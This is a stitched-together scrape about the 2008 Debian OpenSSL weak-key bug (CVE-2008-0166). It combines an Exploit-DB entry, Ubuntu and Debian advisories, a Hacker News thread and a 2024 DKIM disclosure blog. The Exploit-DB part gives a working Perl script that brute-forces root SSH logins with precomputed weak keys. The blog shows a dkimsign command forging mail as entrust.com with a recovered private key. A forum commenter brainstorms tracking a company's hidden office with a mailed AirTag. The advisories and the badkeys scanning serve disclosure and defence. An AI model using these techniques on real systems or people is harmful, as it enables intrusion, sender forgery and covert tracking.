# OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH

#### EDB-ID:

###### 5622

#### CVE:

###### [2008-0166](https://nvd.nist.gov/vuln/detail/CVE-2008-0166)

**Vulnerable App:**

```
the debian openssl issue leads that there are only 65.536 possible ssh
keys generated, cause the only entropy is the pid of the process
generating the key.

This leads to that the following perl script can be used with the
precalculated ssh keys to brute force the ssh login. It works if such a
keys is installed on a non-patched debian or any other system manual
configured to.

On an unpatched system, which doesn't need to be debian, do the following:

keys provided by HD Moore - http://metasploit.com/users/hdm/tools/debian-openssl/
***E-DB Note: Mirror ~ https://github.com/g0tmi1k/debian-ssh***

1. Download http://sugar.metasploit.com/debian_ssh_rsa_2048_x86.tar.bz2
	    https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)

2. Extract it to a directory

3. Enter into the /root/.ssh/authorized_keys a SSH RSA key with 2048
Bits, generated on an upatched debian (this is the key this exploit will
break)

4. Run the perl script and give it the location to where you extracted
the bzip2 mentioned.

#!/usr/bin/perl
my $keysPerConnect = 6;
unless ($ARGV[1]) {
   print "Syntax : ./exploiter.pl pathToSSHPrivateKeys SSHhostToTry\n";
   print "Example: ./exploiter.pl /root/keys/ 127.0.0.1\n";
   print "By mm@deadbeef.de\n";
   exit 0;
}
chdir($ARGV[0]);
opendir(A, $ARGV[0]) || die("opendir");
while ($_ = readdir(A)) {
   chomp;
   next unless m,^\d+$,;
   push(@a, $_);
   if (scalar(@a) > $keysPerConnect) {
      system("echo ".join(" ", @a)."; ssh -l root ".join(" ", map { "-i
".$_ } @a)." ".$ARGV[1]);
      @a = ();
   }
}

5. Enjoy the shell after some minutes (less than 20 minutes)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# USN-612-4: ssl-cert vulnerability

14 May 2008

ssl-cert vulnerability

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 8.04](/security/notices?release=hardy)
* [Ubuntu 7.10](/security/notices?release=gutsy)
* [Ubuntu 7.04](/security/notices?release=feisty)

## Packages

* [ssl-cert](/security/cves?package=ssl-cert) -

## Details

USN-612-1 fixed vulnerabilities in openssl. This update provides the

corresponding updates for ssl-cert -- potentially compromised snake-oil

SSL certificates will be regenerated.

Original advisory details:

A weakness has been discovered in the random number generator used

by OpenSSL on Debian and Ubuntu systems. As a result of this

weakness, certain encryption keys are much more common than they

should be, such that an attacker could guess the key through a

brute-force attack given minimal knowledge of the system. This

particularly affects the use of encryption keys in OpenSSH, OpenVPN

and SSL certificates.

This vulnerability only affects operating systems which (like

Ubuntu) are based on Debian. However, other systems can be

indirectly affected if weak keys are imported into them.

We consider this an extremely serious vulnerability, and urge all

users to act immediately to secure their systems. ([CVE-2008-0166](/security/CVE-2008-0166))

== Who is affected ==

Systems which are running any of the following releases:

* Ubuntu 7.04 (Feisty)
* Ubuntu 7.10 (Gutsy)
* Ubuntu 8.04 LTS (Hardy)
* Ubuntu "Intrepid Ibex" (development): libssl <= 0.9.8g-8
* Debian 4.0 (etch) (see corresponding Debian security advisory)

  and have openssh-server installed or have been used to create an

  OpenSSH key or X.509 (SSL) certificate.

  All OpenSSH and X.509 keys generated on such systems must be

  considered untrustworthy, regardless of the system on which they

  are used, even after the update has been applied.

  This includes the automatically generated host keys used by OpenSSH,

  which are the basis for its server spoofing and machine-in-the-middle

  protection.

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 8.04

* [ssl-cert](https://launchpad.net/ubuntu/%2Bsource/ssl-cert)
  -
  [1.0.14-0ubuntu2.1](https://launchpad.net/ubuntu/%2Bsource/ssl-cert/1.0.14-0ubuntu2.1)

##### Ubuntu 7.10

* [ssl-cert](https://launchpad.net/ubuntu/%2Bsource/ssl-cert)
  -
  [1.0.14-0ubuntu0.7.10.1](https://launchpad.net/ubuntu/%2Bsource/ssl-cert/1.0.14-0ubuntu0.7.10.1)

##### Ubuntu 7.04

* [ssl-cert](https://launchpad.net/ubuntu/%2Bsource/ssl-cert)
  -
  [1.0.13-0ubuntu0.7.04.1](https://launchpad.net/ubuntu/%2Bsource/ssl-cert/1.0.13-0ubuntu0.7.04.1)

In general, a standard system upgrade is sufficient to effect the

necessary changes.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Debian Security Advisory DSA-1571-1                  security@debian.org
<http://www.debian.org/security/>                           Florian Weimer
May 13, 2008                          <http://www.debian.org/security/faq>

Package        : openssl
Vulnerability  : predictable random number generator
Problem type   : remote
Debian-specific: yes
CVE Id(s)      : CVE-2008-0166

Luciano Bello discovered that the random number generator in Debian's
openssl package is predictable.  This is caused by an incorrect
Debian-specific change to the openssl package (CVE-2008-0166).  As a
result, cryptographic key material may be guessable.

This is a Debian-specific vulnerability which does not affect other
operating systems which are not based on Debian.  However, other systems
can be indirectly affected if weak keys are imported into them.

It is strongly recommended that all cryptographic key material which has
been generated by OpenSSL versions starting with 0.9.8c-1 on Debian
systems is recreated from scratch.  Furthermore, all DSA keys ever used
on affected Debian systems for signing or authentication purposes should
be considered compromised; the Digital Signature Algorithm relies on a
secret random value used during signature generation.

The first vulnerable version, 0.9.8c-1, was uploaded to the unstable
distribution on 2006-09-17, and has since propagated to the testing and
current stable (etch) distributions.  The old stable distribution
(sarge) is not affected.

Affected keys include SSH keys, OpenVPN keys, DNSSEC keys, and key
material for use in X.509 certificates and session keys used in SSL/TLS
connections.  Keys generated with GnuPG or GNUTLS are not affected,
though.

A detector for known weak key material will be published at:

  <<http://security.debian.org/project/extra/dowkd/dowkd.pl.gz>>
  <<http://security.debian.org/project/extra/dowkd/dowkd.pl.gz.asc>>
    (OpenPGP signature)

Instructions how to implement key rollover for various packages will be
published at:

  <<http://www.debian.org/security/key-rollover/>>

This web site will be continously updated to reflect new and updated
instructions on key rollovers for packages using SSL certificates.
Popular packages not affected will also be listed.

In addition to this critical change, two other vulnerabilities have been
fixed in the openssl package which were originally scheduled for release
with the next etch point release: OpenSSL's DTLS (Datagram TLS,
basically "SSL over UDP") implementation did not actually implement the
DTLS specification, but a potentially much weaker protocol, and
contained a vulnerability permitting arbitrary code execution
(CVE-2007-4995).  A side channel attack in the integer multiplication
routines is also addressed (CVE-2007-3108).

For the stable distribution (etch), these problems have been fixed in
version 0.9.8c-4etch3.

For the unstable distribution (sid) and the testing distribution
(lenny), these problems have been fixed in version 0.9.8g-9.

We recommend that you upgrade your openssl package and subsequently
regenerate any cryptographic material, as outlined above.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Regardless, it's fun. > The security team at Seznam - a Czech search engine and email provider - did not believe me when I reported this issue. They assume that as they are not actively using that key (beta.\_domainkey.seznam.cz), that means that it cannot be used to forge emails. This is, of course, not true. Maybe consult a lawyer first, but the *entertaining* answer would surely be to tell them about the problem in an email from their own domain?

It turned out our company Outlook (or Exchange? who knows) mail server was configured to relay mail through some 3rd-party SPAM filter and the SPAM filter trusted some headers which weren't stripped on ingress. So you could send an e-mail with the headers set and they would reach the SPAM filter unmodified. As the company had a 3rd-party SPAM filter, all Outlook security was disabled. This allowed me to send e-mail with forged sender. Outlook in its amazing brilliance would attach the "sender's" company photo and show some kind of a "Trusted" badge or something. I reported the issue and the admins weren't impressed. They insisted that this wasn't a major problem since the only way to make the e-mail appear to come from somebody in the company was to use you company account (outside e-mail would be filtered correctly). After some back and forth, I just told the admin to check his mailbox. It said something like, "if you don't think this is serious, you're fired" and it was "from" the CEO, with his smiling photo next to the name. That finally did the trick.

I was interviewing for a financial company that went to some effort to hide their location for operational security, met them at a local cafe where we talked about physical security, and then casually mentioned that I was staying at an airbnb across the road from their office and we could walk back together. It took a couple of calls to find someone who happily told me their registered address. They were creeped out but hired me anyway. | | --- | --- | --- | | | |  |  | [aspenmayer](user?id=aspenmayer) [8 months ago](item?id=40337842)   | [root](#40335642) | [parent](#40335977) | [next](#40335936) [–]  Wouldn't their registered address be public information? I understand that corporations may use agents/lawyers for that kind of thing, with layers of shell companies, but in theory this kind of info is able to be discovered and deduced from tax records, incorporation documents, and for publicly traded companies, SEC filings, etc. Cool story!

It's quite common to have a registered address which is just a forwarding agency. | | --- | --- | --- | | | |  |  | [aspenmayer](user?id=aspenmayer) [8 months ago](item?id=40338951)   | [root](#40335642) | [parent](#40338505) | [next](#40335936) [–]  I guess you could mail a cellphone or AirTag to their registered address, then even if they find it and don’t forward it, you could follow the person(s) who fetch or deliver the mail to the company location. You could maybe even skip the mailing step and just watch the registered address and trace the movements of everyone who visits that location. Do you have any other methods you can think of? | | --- | --- | --- | | | |  |  | [Atotalnoob](user?id=Atotalnoob) [8 months ago](item?id=40339819)   | [root](#40335642) | [parent](#40338951) | [next](#40335936) [–]  Watching the location is a bad idea. I’d hazard a guess that most forwarding agencies have more than 1 customer, so you’ll be on a bunch of wild goose chases. Also forwarding agencies probably don’t visit the clients locations often. | | --- | --- | --- | | | |  |  | [aspenmayer](user?id=aspenmayer) [8 months ago](item?id=40340830)   | [root](#40335642) | [parent](#40339819) | [next](#40335936) [–]  So what do you suggest? | | --- | --- | --- | | | |  |  | [jsiepkes](user?id=jsiepkes) [8 months ago](item?id=40335936)   | [parent](#40335642) | [prev](#40335769) | [next](#40336233) [–]  While you can forge the DKIM signature there is a good chance there is also SPF configured. SPF tells which servers are allowed to send mail for the domain. So your email would likely still end up in the spam folder. | | --- | --- | --- | | | |  |  | [aaronmdjones](user?id=aaronmdjones) [8 months ago](item?id=40336058)   | [root](#40335642) | [parent](#40335936) | [next](#40336233) [–]  DMARC only requires one of SPF or DKIM to pass. DKIM passing and SPF failing won't deter DMARC; the message will land in the inbox. | | --- | --- | --- | | | |  |  | [joveian](user?id=joveian) [8 months ago](item?id=40340390)   | [root](#40335642) | [parent](#40336058) | [next](#40401656) [–]  It turns out there is a bit of an exception to this, which is that plain SPF only applies to the envelope from address, not the From: field, and failure of plain SPF is sometimes (I don't know how often) considered independently from DMARC. | | --- | --- | --- | | | |  |  | [jsiepkes](user?id=jsiepkes) [8 months ago](item?id=40401656)   | [root](#40335642) | [parent](#40336058) | [prev](#40340390) | [next](#40338372) [–]  oh wow, didn't know that. That's actually pretty bad. Why on earth was it designed in such a way that didn't require both tests to pass if both of them are configured. | | --- | --- | --- | | | |  |  | [LeonM](user?id=LeonM) [8 months ago](item?id=40414382)   | [root](#40335642) | [parent](#40401656) | [next](#40410247) [–]  Because SPF has many design flaws that will break SPF for legitimate use-cases (such as relaying/forwarding). You wouldn't want to rely on SPF, you should always on DKIM instead. SPF should be considered legacy at this point. But of course DMARC had to be designed with backwards compatibility in mind, thus it'll still consider the email to be DMARC alignment with just SPF alignment (without DKIM alignment). Also, understand that 'alignment' is different from a 'pass', so it's not as bad as many commenters here make it look. There are proposals of adding a flag to the DMARC policy to have the receiver ignore SPF alignment, thus enforcing DKIM alignment. However, that is not final yet. | | --- | --- | --- | | | |  |  | [aaronmdjones](user?id=aaronmdjones) [8 months ago](item?id=40410247)   | [root](#40335642) | [parent](#40401656) | [prev](#40414382) | [next](#40338372) [–]  Because both of them rely on DNS. DKIM is trivial to bypass if you can create a TXT record with your own key, and SPF is trivial to bypass if you can create a TXT record containing an SPF record with your own IP address / hostname / whatever. Presumably if you can compromise one of them, you can compromise both. | | --- | --- | --- | | | |  |  | [LeonM](user?id=LeonM) [8 months ago](item?id=40414398)   | [root](#40335642) | [parent](#40410247) | [next](#40338372) [–]  > DKIM is trivial to bypass if you can create a TXT record with your own key This is exactly what DMARC prevents. With DMARC the alignment requirement is added, so signing an email with a different domain key will no longer work. For a DMARC pass you need DKIM alignment. DKIM alignment means that the email is correctly signed with a DKIM key that is published under the sender (rfc5322.From) domain. | | --- | --- | --- | | | |  |  | [aaronmdjones](user?id=aaronmdjones) [8 months ago](item?id=40418414)   | [root](#40335642) | [parent](#40414398) | [next](#40338372) [–]  Yes, and if you can get modification access to the TXT records for the sender's domain, you can compromise both DKIM and SPF. That's my point. Edit: More specifically, that it doesn't make sense to force both of them to pass when they both share a single point of failure. | | --- | --- | --- | | | |  |  | [LeonM](user?id=LeonM) [8 months ago](item?id=40419492)   | [root](#40335642) | [parent](#40418414) | [next](#40338372) [–]  If your DNS is compromised it's game over anyway, because then everything is compromised. DNS is a single point of failure. You'll also be able to reroute inbound email, MITM HTTP traffic, order rogue TLS certificates, etc. etc. Saying DKIM is flawed because you can create rogue keys with DNS access is the same as saying the entire PKI is flawed because you can order certificates using DNS-01 verification. | | --- | --- | --- | | | |  |  | [aaronmdjones](user?id=aaronmdjones) [8 months ago](item?id=40421928)   | [root](#40335642) | [parent](#40419492) | [next](#40338372) [–]  I didn't say DKIM was flawed. I wasn't complaining about DKIM at all. You may want to re-read the comment I was replying to. I'm well aware of the consequences of a DNS compromise. I simply said, twice, that DMARC forcing both SPF and DKIM to align and pass doesn't add anything of value; if you are capable of subverting one of them, you are almost certainly capable of subverting both of them at the same time. | | --- | --- | --- | | | |  |  | [kbolino](user?id=kbolino) [8 months ago](item?id=40338372)   | [root](#40335642) | [parent](#40336058) | [prev](#40401656) | [next](#40336233) [–]  That is a common DMARC configuration but not the only one. The failure tolerance is configurable. | | --- | --- | --- | | | |  |  | [thenickdude](user?id=thenickdude) [8 months ago](item?id=40339236)   | [root](#40335642) | [parent](#40338372) | [next](#40336233) [–]  I don't believe this is true, the only knob to tune is for relaxed or strict alignment checks for DKIM and SPF. How do you configure DMARC to require both of DKIM and SPF? The RFC says: <https://datatracker.ietf.org/doc/html/rfc7489#section-4.2> ```    A message satisfies the DMARC checks if at least one of the supported    authentication mechanisms:     1.  produces a "pass" result, and     2.  produces that result based on an identifier that is in alignment,        as defined in Section 3. ``` | | --- | --- | --- | | | |  |  | [kbolino](user?id=kbolino) [8 months ago](item?id=40344807)   | [root](#40335642) | [parent](#40339236) | [next](#40336233) [–]  It seems you are correct.

The xz backdoor made use of a Debian OpenSSH patch, but it wasn't "caused" by it. Without the patch, the malicious xz maintainer could have written a different backdoor without making use of the OpenSSH patch -- for example, since debian packages are compressed with xz, the backdoor could have modified the sshd binary while unpacking the next OpenSSH security update. That would have been slower (attacker might have needed to wait a long time for a security update), and more discoverable since the modified file would be persisted to disk; but it also wouldn't have caused the performance issues that ended up in the discovery of the backdoor. | | --- | --- | --- | | | |  |  | [kemotep](user?id=kemotep) [8 months ago](item?id=40337260)   | [root](#40336233) | [parent](#40336725) | [next](#40336373) [–]  It would be discoverable but only if you ran an additional hash to check the final binary after updating and checking with an out of band source what the hash of the binary should be.

But no. Newer versions of systemd have issues, and this was what systemd pushed. Just why do you think all these distros had the sane patch? For fun? Arch would have ended up with it eventually.

However debian and several other distributions patch openssh to support systemd notification, and libsystemd does depend on lzma. Arch does not directly link openssh to liblzma", so at least one of your examples is wrong. That specific vulnerability was not in Arch. The xz package was potentially vulnerable (although not in reality because "the build script was configured to only inject the bad code in Debian/Fedora based package build environments", while this was a choice by the attacker, it's still true the vulnerability wasn't there), but patching OpenSSH made OpenSSH specifically vulnerable when used with a malicious xz install.

I may have wrongly named Arch in my comment. Thanks for the correction. I'm curious about Arch's claim that "the build script was configured to only inject the bad code in Debian/Fedora based package build environments".

Other distros would have been affected if they used the same packaging setup -- Ubuntu also uses .deb, for example, because it's based on Debian. And some distros IIRC considered themselves "affected" if they ever used a malicious version of the code, just in case, even if the backdoor didn't actually get compiled in to their version. | | --- | --- | --- | | | |  |  | [cassianoleal](user?id=cassianoleal) [8 months ago](item?id=40345298)   | [root](#40336233) | [parent](#40338328) | [next](#40338335) [–]  It's odd to call RPM the "Fedora" format.

I was pretty sure that when possible they build the packages from source themselves rather than bundling pre-existing binaries, and I'd assume that they wouldn't likely have the sources in the final package. IIRC Debian doesn't even like to bundle the headers in with libraries in preference of splitting them off into a separate file, so I'd be kind of shocked if they put the entire source of each library in the .deb files they distribute. | | --- | --- | --- | | | |  |  | [grawlinson](user?id=grawlinson) [8 months ago](item?id=40338575)   | [root](#40336233) | [parent](#40338460) | [next](#40337793) [–]  Arch package maintainer here; we generally encourage building from source for packages provided by the official repositories.

However debian and several other distributions patch openssh to support systemd notification, and libsystemd does depend on lzma. Arch does not directly link openssh to liblzma", so at least one of your examples is wrong. That specific vulnerability was not in Arch. This is such a weird formulation though, because "other distributions" apparently included insignificant parts of the linux landscape like Fedora (i.e. the testing variant of the RedHat world) and SUSE. And if the three largest upstream distris in the linux world have this mistake, calling that "Well some distris, but screw mostly Debian" doesn't sound like a strong point. | | --- | --- | --- | | | |  |  | [Latty](user?id=Latty) [8 months ago](item?id=40338170)   | [root](#40336233) | [parent](#40337793) | [next](#40338655) [–]  I wasn't claiming Debian were somehow singularly at fault, the poster just specifically said Arch was also vulnerable, which wasn't true. | | --- | --- | --- | | | |  |  | [CJefferson](user?id=CJefferson) [8 months ago](item?id=40338655)   | [parent](#40336233) | [prev](#40336327) | [next](#40337140) [–]  Two open source programs I work on have had bad patches added by packagers.

# 16 years of CVE-2008-0166

# Debian OpenSSL Bug

![Confetti Icon](party.svg)
## Breaking DKIM and BIMI in 2024

On May ~~12th~~ 13th, 2008,
[Debian Linux
announced the discovery of a severe security vulnerability in its OpenSSL package](https://lists.debian.org/debian-security-announce/2008/msg00152.html).
A patch in Debian's and Ubuntu's OpenSSL packages broke the random number generator,
effectively limiting the number of possible keys to
a few ten thousand plausible variations.

To celebrate the sixteenth anniversary of this discovery, I am hereby disclosing
that many DKIM setups still used keys vulnerable to this bug in 2024.
This also affects BIMI due to a poorly designed specification.

I presented these findings
[at the miniDebConf Berlin](https://berlin2024.mini.debconf.org/talks/17-breaking-dkim-and-bimi-with-the-2008-debian-openssl-bug/).
A video recording is available
([Youtube](https://www.youtube.com/watch?v=umceD9-QK7g), [direct download high quality](https://meetings-archive.debian.net/pub/debian-meetings/2024/MiniDebConf-Berlin/33-breaking-dkim-and-bimi-with-the-2008-debian-openssl-bug.webm), [direct download low quality](https://meetings-archive.debian.net/pub/debian-meetings/2024/MiniDebConf-Berlin/33-breaking-dkim-and-bimi-with-the-2008-debian-openssl-bug.lq.webm)).

### DKIM keys vulnerable to Debian OpenSSL bug

DKIM is a mechanism that allows sending mail servers to sign emails with a cryptographic
key published via a DNS TXT record.

By scanning DKIM keys with my tool [badkeys](https://badkeys.info/),
I discovered a surprisingly large number of hosts vulnerable to the 2008 Debian
OpenSSL bug. This trivially allowed sending emails with forged DKIM signatures for those
hosts and thereby also passing DMARC checks.

The hosts included notable names like *@cisco.com*, *@oracle.com*,
*@skype.net*, *@github.partners*, *@partner.crowdstrike.com*,
*@partners.dropbox.com*, *@1password.com*, and *@seznam.cz* (unfixed at disclosure, fixed now).

### How many keys were vulnerable?

By scanning the Tranco Top 1 Million list, I collected 355,055 TXT records
with a valid RSA key. Ed25519 keys
were only found in negligible numbers (to be precise, two). DKIM does not support
other key types.

Of the records with RSA keys, 855 were vulnerable to CVE-2008-0166 - around 0.24 %.
777 records contained identical keys. Overall, there were 22 unique vulnerable
keys.

I found 21 additional records with vulnerable keys through other methods.
(Details about the [scanning methodology can be found here](scandkim.html).)

### Most keys came from one company

Most records in the large set of 777 identical keys
were configured as a CNAME to a host belonging to
the company Cakemail.

I tried disclosing this issue to Cakemail.
The affected host has
a [security.txt](https://md02.com/.well-known/security.txt)
file with a security contact address (*security@cakemail.com*) and a link to a PGP
key that does not work (404 error).

After trying to contact
*security@cakemail.com*, I got this error message:
*"We're writing to let you know that the group you tried to contact (security) may not exist, or you may not have permission to post messages to the group."*

Therefore, I did not directly communicate with Cakemail, but they appear to have replaced
their DKIM key. I have disclosed this
issue to many affected organizations. Some have probably contacted Cakemail.

### Why are people using keys with a vulnerability from 2008 in 2024?

I can only speculate, but it may have to do with timing.
The Debian OpenSSL bug was introduced in 2006. It was discovered and fixed in 2008.
The DKIM specification was published as [RFC 4871](https://datatracker.ietf.org/doc/html/rfc4871) in 2007.

DKIM has no requirement to rotate keys. It appears that a sizeable number of companies
configured DKIM TXT records in 2007 and never changed them.

### Why ~~is~~ was seznam.cz listed as unfixed?

The security team at Seznam - a Czech search engine and email provider -
did not believe me when I reported this issue.
They assume that as they are not actively using that key
(*beta.\_domainkey.seznam.cz*), that means that it cannot be used to forge emails.
This is, of course, not true.

### Any other disclosure stories?

While disclosing this issue, I had plenty of bad experiences
with bug bounty programs. In multiple instances, triagers showed
incompetent or highly problematic behavior. I am still in the process of trying
to clarify some issues, I may share some stories at a later point in time.

### Did you find any other vulnerabilities?

I found some RSA keys with very short key sizes, some with 512 bits, some even
smaller. Those can be broken on consumer hardware these days. I have not looked closer into
this.

I also found some unparseable or defective keys. I have not found any other
interesting vulnerabilities.

Generally, large parts of the DKIM ecosystem use substandard cryptographic security.
The majority of DKIM keys use RSA with 1024 bits. The standard recommendation for RSA keys is
to use a minimum key size of 2048 bit. While it has been assumed that powerful
attackers may be able to break 1024-bit RSA for more than 20 years,
such attacks have not been publicly documented.

### How can I check if my DKIM keys are affected by this vulnerability?

The latest version of badkeys allows you to scan DKIM keys directly. (Use
version 0.0.11 or above, as previous versions had a bug that would prevent some DKIM
keys from being scanned.)

badkeys is a Python tool that can be [installed via pip](https://pypi.org/project/badkeys/).

With the parameter *--dkim*, it checks DKIM records in text files. It supports common
formats like DNS zone files or the output from tools like dig or host:

```
$ badkeys -aw --dkim example.org.zone
rsa[2048] key ok, example.org.zone[12]
```

The *-a* parameter shows all keys found, not
just vulnerable ones.
The *-w* parameter enables warnings about insecure or discouraged key
sizes and exponent values.

badkeys can also directly scan DKIM TXT records with the parameter *--dkim-dns*:

```
$ badkeys -aw --dkim-dns 20230601._domainkey.gmail.com dkim._domainkey.entrust.com
rsa[2048] key ok, 20230601._domainkey.gmail.com
blocklist/debianssl vulnerability, rsa[1024], dkim._domainkey.entrust.com
rsawarnings/too_small vulnerability, rsa[1024], dkim._domainkey.entrust.com
```

Obvious caveat: a tool like badkeys can
never find all possible vulnerabilities or compromised keys.

### What is BIMI?

It is a moneymaking scheme invented by certificate authorities.

### What is BIMI, really?

BIMI allows publishing a logo in SVG format that some email services will display
alongside your emails. While not strictly required by the specification,
usually, that will only happen if you also buy an expensive certificate (so-called
Verified Mark Certificate) that asserts that this is your logo.

Those certificates are very expensive (above $1,000 per year).

Here's a Gmail screenshot showing some logos:

![Gmail screenshot](gmaillogos.avif)
### What does BIMI have to do with this vulnerability?

While testing to send DKIM-signed emails, I noticed
that some would show a company logo in Gmail.

BIMI is designed in a way that when you publish a default BIMI
record, all DKIM-signed emails will automatically get BIMI treatment and show a logo.
In some cases, I only controlled the DKIM key of a subdomain, but even then,
the BIMI logo configured for the main domain is shown automatically.

### Wait, haven't you just said that I need an expensive certificate? Doesn't that mean that there needs to be some signature involved from that certificate?

No, and I was very surprised by this.

The [BIMI spec](https://www.ietf.org/archive/id/draft-brand-indicators-for-message-identification-05.html)
is written in a way that there is no cryptographic connection
between the certificate and the DKIM key. As soon as one is able to sign a mail with DKIM,
it passes BIMI.

While BIMI certificates are standard X.509 certificates that contain a cryptographic
key, that key is not used at all.

Certificate authorities in other areas, e.g., in the WebPKI,
are required to guarantee some basic security checking of cryptographic keys, disallow
short RSA keys, and revoke known-compromised keys. No such mechanisms exist for BIMI
and DKIM.

### Can you explain this with an example?

Sure. Let's take the domain *entrust.com*. It
~~has~~ had a DKIM TXT record configured
at *dkim.\_domainkey.entrust.com*:

```
v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyGF0xzO7Eig1H8QdIErjEKOGnIVvoLU5VjcMRBRWZK65NinL+gVnjuMD2mYdjC3f+7sQCWxGDSKIFn/bB+iXxO2x1/ktkwXHQfQ/9FcFuy+LE0Snsm0SwXN/2l1m5f9e1xdswC+dzHt6DIpDSDENsRal019YKQTqwVyB++7QORwIDAQAB
```

This is a 1024-bit RSA key generated with a version of Debian vulnerable to
CVE-2008-0166. We can use badkeys to figure out that
the [private key is this one](https://github.com/badkeys/debianopenssl/blob/main/rsa1024/ssl/le32/25731-rnd.key):

```

-----END RSA PRIVATE KEY-----
```

We can use a tool like [dkimsign](https://manpages.ubuntu.com/manpages/trusty/man1/dkimsign.1.html) (part of [dkimpy](https://pypi.org/project/dkimpy/))
to sign a mail with a sender using
an *@entrust.com* mail address:

```
$ dkimsign dkim entrust.com 25731-rnd.key < unsigned.txt > signed.txt
```

You can find a [signed test mail here](testmail.msg).

